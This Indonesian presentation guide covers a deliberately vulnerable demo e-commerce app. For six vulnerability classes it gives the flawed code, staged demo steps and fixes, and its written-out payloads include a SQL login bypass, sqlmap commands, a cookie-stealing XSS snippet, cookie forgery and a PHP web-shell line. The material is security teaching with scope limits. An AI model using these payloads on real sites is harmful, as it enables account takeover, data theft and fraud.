| 4 | Sepatu Running AirFlex Putih — Size 38–44 | Rp899.000 | SportKita, Yogyakarta |
| 5 | Keyboard Mechanical RGB Hot-Swap 75% | Rp749.000 | TechGear, Semarang |
| 6 | Tas Ransel Laptop Anti Air 15,6 Inci + USB Port | Rp349.000 | TasKita, Makassar |

Sisanya (id 7–42) meliputi tablet, kamera mirrorless, speaker Bluetooth, smartwatch, drone, monitor, kaos, jeans, hijab, hoodie, lampu meja, sofa bed, kasur, gorden, matras yoga, dumbbell, bola sepak, sepeda lipat, tas pinggang, kacamata, dompet, jam tangan, serum, paket skincare, lipstik, parfum, set panci, air fryer, kopi Gayo, teh melati, power bank, mouse wireless, kemeja flanel, dan tanaman Monstera. Setiap produk punya harga coret (harga lama), jumlah terjual, rating, dan stok. Nama toko di katalog adalah nama toko penjual produk itu (misalnya LaptopKita, AudioHub) — berbeda dengan nama toko utama "TokoKita Official Store" yang bisa diubah admin di dashboard.


## 5. Enam kategori, tujuh adegan — penjelasan lengkap tiap kerentanan

Hitungan yang paling jujur untuk presentasi: **6 kategori kelemahan aplikasi, ditampilkan dalam 7 adegan demo**. Ada beberapa adegan yang menunjukkan kategori sama. Nmap bukan kerentanan aplikasi; itu hanya alat pengamatan server lokal.

| Kategori | Nama | Lokasi utama | Adegan demo |
| ---: | --- | --- | --- |
| 1 | SQL Injection (SQLi) | `POST /api/login` dan `GET /api/lab/search` | 2 adegan: bypass login + lab sqlmap |
| 2 | Stored Cross-Site Scripting (stored XSS) | `POST /api/reviews`, lalu review ditampilkan di halaman produk | 1 adegan: review uji + collector |
| 3 | Harga dipercaya dari browser | `POST /api/checkout` | 1 adegan: harga jadi Rp100 |
| 4 | Perlindungan sesi lemah | Cookie `PHPSESSID` tanpa `HttpOnly`; cookie `user` dipercaya sebagai fallback identitas | 1 adegan (menyatu dengan XSS, tapi kategori sendiri) |
| 5 | IDOR (akses object tanpa cek pemilik) | `GET /api/orders/<id>` | 1 adegan: buka order #201 |
| 6 | Upload tanpa validasi memadai | `POST /api/upload` | 1 adegan: upload `shell.php` (simulasi) |

### Bukan kerentanan sungguhan di lab

- `nmap -sV -p 8000 127.0.0.1` hanya mengenali port server demo yang berjalan di laptop sendiri. Jangan arahkan ke Railway.
- URL `/uploads/shell.php?cmd=whoami` menampilkan teks output yang sudah ditulis di kode. Tidak menjalankan perintah Linux dan bukan remote code execution (RCE).
- Header yang menyebut Apache/PHP adalah banner simulasi; backend sebenarnya Python stdlib.
- `tokokita-lab.db` hanya berisi empat produk latihan; tidak ada akun/pesanan di dalamnya.

---

### Kategori 1 — SQL Injection: login dan lab sqlmap

**Apa artinya, dengan bahasa sehari-hari?**

Aplikasi menyimpan data dengan SQL — bahasa untuk bertanya ke database. Kalau program menempelkan teks dari formulir langsung ke query (pertanyaan ke database), masukan tertentu dapat mengubah arti query itu. Ibaratnya, pengguna tidak sekadar mengisi jawaban di formulir, tapi mengubah pertanyaan yang diajukan ke database.

Contoh: program mau bertanya, "Cari user yang usernamenya X dan passwordnya Y." Kalau X diisi dengan teks khusus, pertanyaannya berubah menjadi, "Cari user yang usernamenya X ATAU 1=1" — dan karena 1 selalu sama dengan 1, syarat itu selalu benar, jadi database mengembalikan baris pertama, apa pun passwordnya.

**Di mana letak kesalahannya di kode?**

Di `server.py`, fungsi `api_login`. Query login dibentuk dengan menggabungkan (string interpolation, operator `%`) username dan password langsung ke teks SQL:

```sql
SELECT username, role, label, email FROM users
WHERE password = '<password-yang-diketik>' AND username = '<username-yang-diketik>'
```

Tidak ada parameterized statement (cara aman: input diperlakukan sebagai data, bukan potongan query). Ada dua jalur yang sama-sama rentan di fungsi yang sama: pencarian email (`SELECT username FROM users WHERE email = '<identifier>'`) dan query login utama di atas. Selain itu, kalau query gagal (misalnya payload merusak sintaks SQL), server membalas dengan status 500 dan pesan `SQL error: ...` yang membocorkan detail error database — ini error-based SQLi, dan temuan audit C di Bagian 6.

**Adegan login (Burp Repeater):**

1. Kamu menampilkan halaman toko dan bilang alur login terlihat normal.
2. Pelaku menguji login menggunakan Burp Repeater. Kamu tidak perlu mengetik payload sendiri.
3. Di browser Burp, isi username:
   ```text
   ' OR '1'='1
   ```
   Isi password apa saja, misalnya `demo`, lalu tekan Masuk.
4. Di Burp **Proxy → HTTP history**, cari `POST /api/login`, klik kanan → **Send to Repeater**.
5. Pada tab **Repeater**, periksa request: `Content-Type: application/json`, body berisi `identifier` dan `password`. Klik **Send**.
6. Pelaku menunjukkan response berisi akun hasil bypass, dengan `role: admin` — itu akun Kamu, admin demo, didapat tanpa password yang benar. Baris pertama di tabel `users` adalah Kamu, jadi bypass selalu menghasilkan admin.
7. Kamu bereaksi pada dampaknya: "Jadi sistem percaya pada input tanpa memeriksa kredensial dengan benar."

Penting untuk dijelaskan ke audiens: ini bukan password cracking (menebak password berkali-kali). Inputnya mengubah logika query karena query menyambung string input. Satu request saja cukup.

**Adegan lab sqlmap — apa bedanya?**

Ini jalur latihan tersendiri agar sqlmap dapat digunakan tanpa diarahkan ke tabel akun atau pesanan toko. Route `/api/lab/search` di `server.py` membaca `tokokita-lab.db` (fungsi `lab_db(readonly=True)`):

- Koneksi query mode read-only (`PRAGMA query_only = ON`) plus progress handler yang membatasi waktu eksekusi query.
- Hanya tabel `lab_products`, hanya query `SELECT`, hasil dibatasi maksimal 10 baris.
- Input `category` dibatasi maksimal 4096 karakter (supaya payload deteksi sqlmap bisa lewat, tapi tidak tak terbatas).
- Data terdiri dari empat produk dummy (Bagian 4.3).

Query-nya juga dibentuk dengan menempelkan input langsung:

```sql
SELECT id, name, category, description FROM lab_products
WHERE category = '<category>' LIMIT 10
```

**Peran Kamu di adegan lab:** jelaskan bahwa tool otomatis membantu menguji konsistensi temuan, tetapi pemindaian bisa mengirim banyak request. Pelaku menjalankannya di localhost sebelum presentasi; saat di panggung cukup tunjukkan hasil yang disiapkan dan satu request `curl` yang menampilkan fixture:

```bash
curl 'http://127.0.0.1:8000/api/lab/search?category=electronics'
```

Hasil yang diharapkan: dua produk, `Demo Laptop A` dan `Demo Mouse B`. Untuk melihat seluruh empat fixture dalam satu request tanpa sqlmap:

```bash
curl --get --data-urlencode "category=electronics' OR '1'='1' -- " \
  'http://127.0.0.1:8000/api/lab/search'
```

Hasil yang diharapkan: tepat empat produk demo.

Perintah sqlmap lokal terbatas (jalankan sebelum acara; tidak ke web publik):

```bash
sqlmap -u 'http://127.0.0.1:8000/api/lab/search?category=electronics' \
  -p category --batch --flush-session --level=1 --risk=1 \
  --technique=BEU --timeout=5 --retries=0
```

Arti tiap opsi: `-p category` membatasi pengujian ke parameter yang disengaja rentan; `--batch` memakai jawaban default agar tidak berhenti pada prompt; `--flush-session` membuang cache hasil sebelumnya; `--level=1 --risk=1` nilai minimum; `--technique=BEU` membatasi ke boolean, error, dan UNION (hindari `T` karena time-based extraction lambat — bisa beberapa menit per nilai); `--timeout=5 --retries=0` jangan menunggu lama atau mengulang berkali-kali. Hasil yang diharapkan: sqlmap mengidentifikasi `category` sebagai injectable dan backend sebagai SQLite. Pada verifikasi lokal, deteksi boolean/UNION selesai dengan 46 request dalam sekitar satu detik. Tidak perlu menjalankan query dump/extract. Sqlmap dapat mencatat beberapa response `400` saat mencoba payload sintaks yang tidak cocok; selama tetap menemukan parameter injectable, ini tidak berarti endpoint mati. Jangan menaikkan intensitas untuk menghilangkan semua 400.

**Batas adegan lab:** jangan jalankan sqlmap ke `/api/login`, `/api/orders`, hostname Railway, atau target lain. Jangan pakai `--dump`, `--all`, `--os-shell`, `--file-read`, `--file-write`, `--forms`, crawl, tamper, level/risk tinggi, atau banyak thread. Tidak perlu dump database. Tidak semua teknik sqlmap cepat; time-based blind bisa sangat lambat.

**Dampak di aplikasi nyata:** login tanpa izin, pembacaan/perubahan data jika query lain juga rentan. Dampak sebenarnya bergantung pada query dan hak database.

**Perbaikan nyata:** prepared/parameterized statements; input diperlakukan sebagai data, bukan potongan query. Jangan menampilkan detail error SQL kepada pengguna. Beri database hak seminimal mungkin (least-privilege). Pada aplikasi nyata, jangan menyisakan route lab yang sengaja rentan.

---

### Kategori 2 — Stored XSS dan cookie sesi

**Apa artinya?**

Situs menerima konten pengguna, menyimpannya, lalu menampilkannya sebagai HTML tanpa pengamanan. Browser bisa menjalankan JavaScript dari konten tersebut seolah-olah berasal dari situs. **Stored** berarti payload tersimpan di database, bukan hanya ada sementara di alamat halaman. Seseorang yang membuka halaman yang memuat review itu dapat memicu kodenya — bahkan berhari-hari kemudian, selama review itu belum dihapus.

**Di mana letak kesalahannya di kode?**

Dua tempat, yang saling melengkapi:

1. **Server menyimpan ulasan mentah.** `server.py`, fungsi `api_post_review`: teks ulasan dimasukkan ke tabel `reviews` apa adanya, tanpa sanitasi atau encoding.
2. **Browser menampilkan ulasan mentah sebagai HTML.** `js/app.js`, fungsi `renderReviews`: daftar ulasan dirender dengan `innerHTML`, dengan `r.author` dan `r.text` dimasukkan langsung tanpa `esc()`. Padahal di file yang sama ada fungsi `esc()` yang dipakai untuk nama produk dan kolom lain — tapi sengaja tidak dipakai untuk ulasan. Komentar di kodenya: "Sengaja rentan: author & text dirender tanpa esc() → stored XSS."

**Adegan dua laptop (langkah demi langkah):**

1. Kamu login sebagai akun admin dummy (`[username-admin]` / `[password-admin]`) di browser pada laptopnya.
2. Pelaku menaruh review uji pada produk melalui laptopnya. Payload yang dipakai untuk collector:
   ```html
   <img src=x onerror="if(document.cookie.includes('user=[username-admin]'))fetch('/api/collect?c='+encodeURIComponent(document.cookie))">
   ```
   Penjelasan payload untuk Kamu: ini sebuah tag gambar yang sengaja rusak (`src=x`), sehingga browser menjalankan kode di `onerror` saat gambar gagal dimuat. Kode itu memeriksa dulu apakah cookie berisi `user=[username-admin]` — jadi hanya cookie admin demo yang dikirim, bukan cookie sembarang pengunjung — lalu mengirim seluruh `document.cookie` ke `/api/collect` di aplikasi sendiri.
3. Kamu membuka halaman produk yang sama pada browser demo yang dikendalikan tim.
4. Payload membaca cookie Kamu dan mengirimnya ke `/api/collect` pada aplikasi sendiri.
5. Pelaku membuka `/collector` pada laptopnya untuk menunjukkan bukti cookie demo diterima. Halaman `/collector` menampilkan tabel jam, IP, dan cookie yang masuk (dengan escape HTML, jadi cookie yang tampil di sana tidak ikut menjalankan kode).

**Pembatas collector (penting, supaya tidak salah paham):** `server.py`, endpoint `GET /api/collect`, hanya menerima string cookie yang memiliki pasangan tepat `user=[username-admin]` dan panjang maksimal 1024 karakter, dan hanya menyimpan maksimal 50 entri di memori proses (`STOLEN`). Cookie akun lain ditolak dengan 404. Ini pembatas demo, **bukan bukti bahwa stored XSS aman**: payload tetap berjalan pada halaman produk, dan kolektor tetap menerima token sesi admin dummy yang cocok. Collector menyimpan hasil di memori proses — reset API toko tidak menghapus daftar itu; restart/redeploy aplikasi yang membersihkannya.

**Varian payload yang lebih aman untuk latihan lokal:** kalau mau menunjukkan stored XSS tanpa mengirim cookie ke mana pun, pakai payload alert:

```html
<img src=x onerror="alert('Stored XSS demo')">
```

Login dengan akun demo pada browser lokal yang dikendalikan tim, buka halaman produk, kirim payload sebagai review, reload halaman produk. Dialog alert menunjukkan stored payload dieksekusi saat render. Reset database lokal sesudahnya.

**Peran dan persetujuan:** Kamu harus tahu kapan adegan dimulai, login hanya dengan akun demo, dan menyetujui payload. Jangan gunakan akun pribadi. Jangan menampilkan token aktif terlalu lama ke proyektor atau rekaman; token sesi harus diperlakukan sebagai rahasia sementara. Jangan salin cookie ke host lain, jangan gunakan sesi/akun pribadi, dan segera reset ulasan setelah adegan.

**Dampak di aplikasi nyata:** script dapat bertindak dalam konteks situs (misalnya mengubah nama toko, membuat pesanan, mengubah data) dan, bila cookie bisa dibaca, berpotensi mencuri sesi. Pengunjung yang membuka review dapat terdampak — karena itu adegan harus singkat dan payload dihapus segera.

**Perbaikan nyata:** encode teks saat ditampilkan (seperti fungsi `esc()` yang sudah ada di `app.js` tapi tidak dipakai untuk ulasan); jika rich text diperlukan, sanitasi dengan allowlist; tambah Content Security Policy (CSP); cookie sesi `HttpOnly`, `Secure`, `SameSite`; rotasi sesi setelah login.

---

### Kategori 3 — Harga checkout diubah dari sisi browser

**Apa artinya?**

Informasi di halaman atau DevTools dikendalikan pengguna. Hidden input (kolom tersembunyi di formulir) bukan tempat aman untuk menyimpan harga. Browser boleh menampilkan harga untuk kenyamanan, tapi server harus menghitung ulang harga dari database-nya sendiri.

**Di mana letak kesalahannya di kode?**

Dua tempat:

1. **Browser mengirim harga.** `js/app.js`, fungsi `renderCheckout`: rincian pembayaran dirender sebagai form dengan hidden input per produk, `id="priceField<id>"` dan `value="<harga>"`. Fungsi `doCheckout` membaca nilai hidden input itu (`document.getElementById("priceField" + id).value`) dan mengirimkannya sebagai `price` di `POST /api/checkout`. Komentar di kodenya: "Sengaja rentan: harga dari hidden input dikirim dan dipercaya server."
2. **Server memakai harga itu apa adanya.** `server.py`, fungsi `api_checkout`: untuk setiap item, `price = int(it.get("price") or 0)` lalu `total += price * qty`. Tidak ada pengecekan ke database produk, tidak ada pengecekan stok, tidak ada pengecekan login. Komentar di kodenya: "SENGAJA: percaya harga client".

**Adegan (dua cara menunjukkan hal yang sama):**

Cara A — Burp Repeater (yang dipakai di panggung):

1. Gunakan browser Burp dan masukkan produk laptop demo ke keranjang.
2. Buka checkout. Di Burp HTTP history cari `POST /api/checkout`.
3. Klik kanan → **Send to Repeater**.
4. Di body JSON ubah nilai `price` item laptop menjadi `100`; jangan ubah endpoint/parameter lain.
5. Klik **Send** satu kali.
6. Periksa response: total menjadi `100` dan ada nomor order baru.

Cara B — Browser DevTools (alternatif, lebih visual):

1. Buka checkout dengan produk laptop di browser presenter.
2. Buka DevTools → **Console**, jalankan:
   ```js
   document.getElementById('priceField1').value = 100
   ```
3. Klik tombol bayar sekali; UI menunjukkan total Rp100.
4. Untuk pembuktian jaringan, buka Network tab dan lihat body `POST /api/checkout`.

Jangan mengirim berkali-kali; tiap request dapat membuat order baru (ID 301, 302, dan seterusnya). Jalankan reset setelah demonstrasi.

**Dampak nyata:** manipulasi nilai transaksi, diskon, kuantitas, atau field lain yang dipercaya dari client. Di aplikasi nyata, ini berarti toko dibayar jauh lebih murah dari harga sebenarnya.

**Perbaikan nyata:** kirim ID produk dan jumlah saja; server membaca harga resmi dari database, memvalidasi stok, lalu menghitung total server-side. Jangan pernah memakai harga, diskon, atau total yang dikirim client.

**Catatan data:** request checkout berhasil membuat order baru. Jalankan reset setelah demonstrasi (reset menghapus order checkout ber-ID >= 301).


### Kategori 4 — Perlindungan sesi lemah

**Apa artinya?**

Cookie sesi adalah token yang membantu server mengenali browser yang sudah login. `HttpOnly` adalah perlindungan agar JavaScript halaman tidak dapat membaca cookie tersebut. Kalau cookie tidak memakai `HttpOnly`, JavaScript apa pun yang berjalan di halaman itu — termasuk JavaScript dari ulasan berbahaya (stored XSS) — bisa membaca cookie dan mengirimkannya ke tempat lain. Setelah cookie dicuri, pencuri bisa menempel cookie itu di browsernya sendiri dan dianggap sudah login sebagai korban (pembajakan sesi).

**Di mana letak kesalahannya di kode?**

Di `server.py`, fungsi `start_session`:

```python
self._cookies.append("PHPSESSID=%s; Path=/" % token)
self._cookies.append("user=%s; Path=/" % username)
```

Komentar di kodenya: "SENGAJA tanpa HttpOnly: cookie bisa dibaca JavaScript (stored XSS)." Tidak ada `HttpOnly`, tidak ada `Secure`, tidak ada `SameSite` pada kedua cookie itu.

Tapi itu baru separuh ceritanya. Masalah yang lebih besar ada di fungsi `current_user` (dijelaskan juga di Bagian 2.2): kalau token `PHPSESSID` tidak ditemukan, server **percaya begitu saja pada cookie `user`**. Ini dibahas tuntas sebagai temuan audit B di Bagian 6, karena akibatnya lebih langsung daripada pencurian sesi lewat XSS: penyerang tidak perlu mencuri apa pun, cukup menulis sendiri cookie `user=[username-admin]` di browser, dan server langsung menganggapnya admin. Di README, jalur ini bahkan didokumentasikan sebagai "jalur cadangan kalau XSS gagal saat live":

```js
document.cookie = "user=[username-admin]; path=/";
location.reload();
```

Setelah itu, buka Dashboard Penjual dan ganti nama toko jadi `TOKO DIHACK` — perubahan tersimpan di server. Itu menunjukkan bahwa kelemahan sesi di sini bukan cuma soal `HttpOnly`, tapi soal identitas yang dipercaya dari cookie yang bisa ditulis siapa saja.

**Adegan:** kategori ini tidak punya adegan terpisah — adegannya menyatu dengan adegan stored XSS (Kategori 2), di mana cookie Kamu yang terbaca JavaScript dikirim ke collector dan ditampilkan di `/collector`. Saat adegan itu berlangsung, Kamu bisa menjelaskan: "Cookie saya bisa dibaca JavaScript karena tidak ada perlindungan HttpOnly. Dan di aplikasi ini, cookie berisi nama user juga dipercaya begitu saja — jadi sebenarnya ada dua jalan masuk, bukan satu."

**Peran Kamu:** pada adegan XSS, tegaskan bahwa sesi yang dipakai adalah sesi akun demo yang disetujui untuk ditampilkan buktinya, bukan akun pribadi. Jangan menampilkan token aktif terlalu lama ke proyektor atau rekaman.

**Perbaikan nyata:** cookie sesi memakai `HttpOnly`, `Secure`, dan `SameSite`; identitas pengguna ditentukan dari token sesi yang valid di server (disimpan di `SESSIONS` dan dicocokkan dengan database), bukan dari cookie berisi username; rotasi sesi setelah login (buat token baru setiap kali login berhasil).

---

### Kategori 5 — IDOR pada pesanan

**Apa artinya?**

IDOR adalah kondisi saat aplikasi menerima ID object — misalnya nomor pesanan — tetapi tidak memastikan bahwa pengguna yang meminta memang berhak melihat object itu. Ibarat nomor laci di loker: siapa pun yang tahu nomor lacinya bisa membuka laci itu, tanpa ditanya apakah laci itu miliknya.

**Di mana letak kesalahannya di kode?**

Di `server.py`, handler `GET /api/orders/<id>`:

```python
# SENGAJA IDOR: tidak ada pengecekan pemilik pesanan.
row = conn.execute("SELECT * FROM orders WHERE id = ?", (oid,)).fetchone()
```

Tidak ada pemeriksaan login, tidak ada pemeriksaan pemilik. Bandingkan dengan endpoint yang benar, `GET /api/orders/mine`, yang mengharuskan login dan hanya mengembalikan pesanan dengan `owner = <username-yang-login>`. Endpoint IDOR itu melewati semua pemeriksaan itu.

Perlu dicatat: query-nya sendiri memakai parameter (`?`), jadi endpoint ini tidak rentan SQLi — kelemahannya murni otorisasi (tidak ada cek pemilik), bukan injection.

**Adegan:**

1. Login sebagai `rohandhika` (pembeli demo), atau bahkan tanpa login sama sekali — endpoint ini tidak memeriksa login.
2. Buka di browser:
   ```
   http://127.0.0.1:8000/pages/orders.html?id=201
   ```
   Atau langsung ke API:
   ```
   GET /api/orders/201
   ```
   Di demo publik: `https://tokokita-web-production.up.railway.app/api/orders/201`
3. Response `200` berisi pesanan milik Kamu: Laptop ASUS Vivobook 14, Rp8.999.000, alamat `Jl. Merdeka No. 45, Medan`, telepon `0812-xxxx-8899`, status Selesai.
4. Ganti ke `?id=202` untuk pesanan Sari Dewi (Headphone Sony WH-1000XM5, Rp4.299.000, Jl. Gatot Subroto No. 8, Medan).
5. Batasi demonstrasi ke ID fixture `201`, `202`, atau `203`. Jangan enumerasi ID lain.

**Dampak nyata:** kebocoran detail pesanan dan data pribadi (nama, alamat, nomor telepon). Data alamat/telepon pada lab hanya data contoh tersamar, bukan data sungguhan — tapi di aplikasi nyata, data seperti ini adalah data pribadi pelanggan.

**Perbaikan nyata:** cek otorisasi kepemilikan di server setiap kali object diminta (apakah `order.owner` sama dengan user yang login, atau user itu admin); gunakan respons yang tidak membocorkan field yang tidak diperlukan; kalau object bukan milik yang meminta, balas dengan 403 atau 404 yang sama seperti object tidak ada, supaya penyerang tidak bisa membedakan.

---

### Kategori 6 — Upload tanpa validasi dan shell simulasi

**Apa artinya?**

Aplikasi menerima file tanpa memastikan jenis, isi, dan ukuran yang aman. Di aplikasi nyata, file yang bisa diakses lewat web atau dieksekusi server dapat berbahaya: misalnya file `.php` yang diunggah lalu dibuka lewat browser bisa menjalankan kode di server.

**Di mana letak kesalahannya di kode?**

Di `server.py`, fungsi `api_upload`: nama file diambil dari parameter `name`, isi file dibaca dari body request, lalu langsung ditulis ke folder `uploads/` — tanpa validasi ekstensi, tanpa validasi isi, tanpa batas ukuran, tanpa memeriksa login. Komentar di kodenya tidak ada yang menyembunyikan ini; `js/app.js` (`handleFile`) juga berkomentar: "Sengaja rentan: server menerima file apa pun tanpa validasi ekstensi."

Lalu, fungsi `serve_upload`: kalau nama file berakhiran `.php`, server menampilkan halaman shell — tapi **shell itu simulasi**. Fungsinya, `fake_shell`, hanya memilih output dari kamus `SHELL_OUTPUTS` yang sudah ditulis di kode:

| Perintah yang diketik | Output yang ditampilkan (palsu) |
| --- | --- |
| `whoami` | `www-data` |
| `id` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| `pwd` | `/var/www/tokita/uploads` |
| `ls` | `index.php  uploads  config.php  .env  backup.sql` |
| `uname -a` | `Linux tokokita-prod 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux` |
| `cat /etc/passwd` | Dua baris pengguna palsu (`root` dan `www-data`) |
| `cat .env` | `DB_HOST=localhost`, `DB_USER=tokokita`, `DB_PASS=tokokita_prod_2026` (palsu) |
| Perintah lain | `sh: 1: <perintah>: not found` |

Tidak ada `os.system`, `subprocess`, `exec`, atau pemanggilan perintah sistem apa pun di `server.py`. Halaman shell juga selalu menulis "simulasi lab — tidak ada perintah nyata yang dijalankan" di bawahnya.

**Adegan (hanya lokal, jangan upload ke publik):**

1. Jalankan TokoKita lokal (`python3 server.py`).
2. Login akun demo, buka Profil → unggah file dummy bernama `shell.php` (isi teks biasa; tidak perlu memasukkan kode PHP sungguhan — misalnya isi `<?php system($_GET['cmd']); ?>` pun **tidak akan dieksekusi**).
3. Buka URL yang ditampilkan, atau:
   ```text
   http://127.0.0.1:8000/uploads/shell.php?cmd=whoami
   ```
4. Halaman menampilkan output simulasi `www-data`.
5. Jangan unggah ke deployment publik. Upload publik bisa meninggalkan artefak dan reset API tidak menghapusnya.

**Penting, dan harus ditegaskan di panggung:** ini **bukan RCE sungguhan**. Jangan menarasikan seolah-olah server berhasil ditembus lewat shell nyata. Yang didemokan adalah risiko upload tanpa validasi; shell-nya hanya ilustrasi dampak, supaya audiens membayangkan apa yang terjadi kalau file yang diunggah benar-benar bisa dieksekusi di aplikasi nyata.

**Perbaikan nyata:** allowlist format dan ukuran, validasi isi file (bukan cuma ekstensi), simpan di luar webroot, nama file acak (bukan nama asli dari pengguna), dan nonaktifkan eksekusi di lokasi upload. Wajibkan login untuk upload.

**Untuk presentasi:** lakukan hanya lokal. Jangan upload file ke publik; reset API tidak menghapus upload. Untuk membersihkan upload lokal, hentikan server dan hapus isi folder `uploads/`.

---

## 6. Temuan audit tambahan — di luar adegan demo

Lima temuan berikut nyata di kode, tetapi **bukan adegan demo dan tidak mengubah hitungan 6 kategori / 7 adegan**. Bagian ini ada supaya Kamu paham proyek ini secara utuh — Pelaku yang membuat proyeknya, Kamu perlu paham juga sedetail mungkin — dan supaya tidak ada yang mengklaim aplikasi "aman di luar enam kategori itu", serta supaya Kamu siap jika audiens atau juri bertanya lebih dalam.

| # | Temuan | Di mana di kode | Kenapa penting | Perbaikan nyata |
| ---: | --- | --- | --- | --- |
| A | Password disimpan plaintext, tanpa hashing | `server.py`, `SEED_USERS` dan `api_register`: `INSERT INTO users(username, password, ...)` dengan password apa adanya | Satu kebocoran database langsung membocorkan semua password apa adanya; password yang sama dipakai di tempat lain ikut bocor | Hash password dengan algoritma khusus password, misalnya bcrypt atau argon2; jangan pernah menyimpan password plaintext |
| B | Cookie `user=[username-admin]` dipercaya tanpa token | `server.py`, `current_user`: kalau `PHPSESSID` tidak ketemu, `username = self.cookies().get("user")` tanpa verifikasi apa pun | Siapa pun bisa mengatur cookie itu di browser dan dianggap admin — tanpa XSS sama sekali, tanpa mencuri apa pun, tanpa password | Identitas hanya dari token sesi yang valid dan terverifikasi di server; jangan pernah percaya cookie berisi username |
| C | `/api/login` membocorkan error SQL | `server.py`, `api_login`: `except sqlite3.Error as exc: return {"error": "SQL error: %s" % exc}, 500` | Pesan error membantu penyerang menyusun payload SQLi berikutnya (error-based SQLi) | Tampilkan pesan generik ke pengguna ("Username/email atau kata sandi salah"); catat detail error hanya di log server |
| D | Checkout tanpa login dan tanpa validasi negatif | `server.py`, `api_checkout`: tidak memanggil `current_user` untuk wajib login; `price` dan `qty` langsung dipakai tanpa cek `> 0` | Pesanan bisa dibuat tanpa akun (pemilik "tamu"), dan harga atau jumlah negatif tidak ditolak — total bisa negatif atau nol | Wajib login; validasi harga dari database dan jumlah harus positif; hitung total di server |
| E | Upload tanpa login dan tanpa batas ukuran | `server.py`, `api_upload`: tidak memeriksa login, tidak memeriksa ukuran (`Content-Length` dibaca apa adanya) | File bisa diunggah tanpa akun, dan ukuran file tidak dibatasi — server bisa dipenuhi file besar | Wajib login; tetapkan batas ukuran, allowlist format, dan validasi isi |

**Cara menjelaskan ke audiens, dengan bahasa sederhana:**

- **Password plaintext:** "Password di database kami simpan apa adanya. Di aplikasi nyata itu tidak boleh — password harus disimpan sebagai hash, jadi database bocor pun password aslinya tidak langsung terbaca."
- **Cookie `user` dipercaya mentah-mentah:** "Ini sebenarnya lebih parah dari cookie yang bisa dicuri. Penyerang tidak perlu mencuri apa pun — cukup menulis sendiri cookie `user=[username-admin]` di browser, server langsung menganggapnya admin."
- **Error SQL bocor:** "Kalau login gagal dengan cara tertentu, server menjawab dengan detail error databasenya. Itu seperti memberi petunjuk gratis untuk serangan berikutnya."
- **Checkout dan upload tanpa login:** "Dua endpoint ini tidak memeriksa siapa yang mengirim request, dan tidak memeriksa apakah angka atau ukurannya masuk akal. Di aplikasi nyata, keduanya harus wajib login dan divalidasi di server."

> [!NOTE]
> Temuan-temuan ini **didokumentasikan, bukan diperbaiki di kode demo**. Celahnya sengaja ada agar demo berjalan; menambalnya di `server.py` akan mematikan adegan presentasi. Perbaikannya adalah pekerjaan setelah presentasi, kalau TokoKita dikembangkan jadi aplikasi sungguhan.

**Satu hal lagi yang sudah selesai — file `mitm_mcp_traffic.db`:** file ini sempat ikut ter-commit di repo tanpa penjelasan. Audit isinya (dibuka read-only atas persetujuan Pelaku) menunjukkan: satu tabel `flows` (skema recorder mitmproxy MCP) dengan **0 baris** — tidak ada URL, header, body, token, atau data toko sama sekali. File itu sudah dihapus dari repo (commit `5524bd8`) dan ditambahkan ke `.gitignore` (commit `7182ca9`). Jadi item terbuka ini sudah tertutup; tidak ada data yang hilang karena file itu kosong.


## 7. Alur acara dua laptop (12 menit) — rundown resmi

Ini satu-satunya urutan panggung yang berlaku. Penomoran **Adegan 1–7** hanya ada di tabel ini; bagian lain memakai nomor kategori agar tidak ada dua penomoran yang bertabrakan. Urutan ini dipilih karena ceritanya berkembang dari yang paling terlihat (harga) ke yang paling dalam (XSS dan upload): orientasi → dampak sederhana → kontrol akses → injection → XSS/upload → mitigasi.

### Sebelum audiens masuk — checklist persiapan

- [ ] Pelaku menguji seluruh langkah pada server lokal; sqlmap dan Nmap selesai sebelumnya. Jangan menjalankan sqlmap atau Nmap untuk pertama kalinya di panggung.
- [ ] Screenshot singkat hasil sqlmap disiapkan agar tidak menunggu tool di panggung. Siapkan juga screenshot hasil Nmap lokal kalau mau ditampilkan sekilas.
- [ ] Kamu login ke akun dummy hanya saat diperlukan (jangan login terlalu awal dan membiarkan sesi terbuka lama).
- [ ] Pastikan domain yang dibuka hanya domain aplikasi TokoKita (lokal `http://127.0.0.1:8000` atau publik `https://tokokita-web-production.up.railway.app`).
- [ ] Tutup tab lain dan notifikasi. Jangan menayangkan cookie token mentah ke proyektor atau rekaman.
- [ ] Sepakati isyarat berhenti. Kamu boleh berkata "stop" kapan saja; Pelaku langsung menghentikan adegan.
- [ ] Pastikan hanya satu presenter yang mengirim request pada satu waktu di deployment publik (satu browser terkendali, satu request pada satu waktu).
- [ ] Siapkan fallback: screenshot/rekaman untuk setiap adegan, supaya kalau satu langkah gagal di panggung, presentasi tetap jalan tanpa improvisasi ke target lain.

### Urutan adegan

| Adegan | Waktu | Layar / aksi | Peran Kamu dan narasi |
| ---: | --- | --- | --- |
| — | 0:00–1:00 | Dua laptop menampilkan TokoKita normal | Perkenalkan peran, izin, dan scope. "Saya pemilik TokoKita. Pelaku menguji aplikasi demo ini dengan izin saya." |
| — | 1:00–2:00 | Browser Burp membuka halaman; HTTP history muncul | "Ini request yang dikirim browser ke aplikasi." Jelaskan bahwa setiap klik di toko mengirim request, dan Burp hanya menampilkannya. |
| 1 | 2:00–3:30 | Pelaku tunjukkan harga checkout berubah jadi Rp100 | "Harga seharusnya dihitung server, bukan dipercaya dari browser." |
| 2 | 3:30–5:00 | Pelaku buka order fixture #201 | "Nomor pesanan bukan pengganti pemeriksaan hak akses." |
| 3 | 5:00–6:30 | Burp Repeater menunjukkan SQLi login | "Input login mengubah cara aplikasi bertanya ke database." |
| 4 | 6:30–7:30 | Screenshot sqlmap lokal + curl fixture | "Tool membantu memastikan parameter lab rentan; database latihan terpisah." |
| 5 | 7:30–9:30 | Review uji, Kamu membuka produk, Pelaku menunjukkan collector | "Konten tersimpan dapat berjalan saat dibuka. Ini sesi demo yang saya setujui." |
| 6 | 9:30–10:15 | Upload/shell simulasi hanya jika waktu cukup dan lokal | Tegaskan output palsu, bukan command sungguhan. |
| 7 | 10:15–12:00 | Slide temuan dan mitigasi | Tutup dengan pelajaran: validasi/otorisasi harus dilakukan server. Reset setelahnya. |

Nmap bukan pembuka di panggung. Pelaku menjalankannya sebelumnya pada `127.0.0.1`; hasilnya hanya konteks port lokal, bukan temuan aplikasi. Kalau mau disebutkan, sebutkan singkat di awal sebagai konteks ("server demo lokal kami membuka port 8000"), lalu lanjut ke adegan.

### Kalimat transisi sederhana (dipakai antar adegan)

